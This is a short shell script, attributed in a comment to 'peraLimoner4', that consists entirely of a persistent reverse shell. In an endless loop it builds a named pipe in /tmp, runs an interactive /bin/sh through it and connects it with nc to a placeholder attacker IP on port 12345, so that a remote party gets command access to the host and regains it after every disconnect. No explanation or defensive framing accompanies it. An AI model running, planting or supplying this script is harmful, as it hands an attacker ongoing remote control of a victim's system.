#!/bin/sh

#codigo desarrollado por peraLimoner4

while [ 1 ]; do
	rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc  /put_the_atacker_ip_here 12345 > /tmp/f 
done
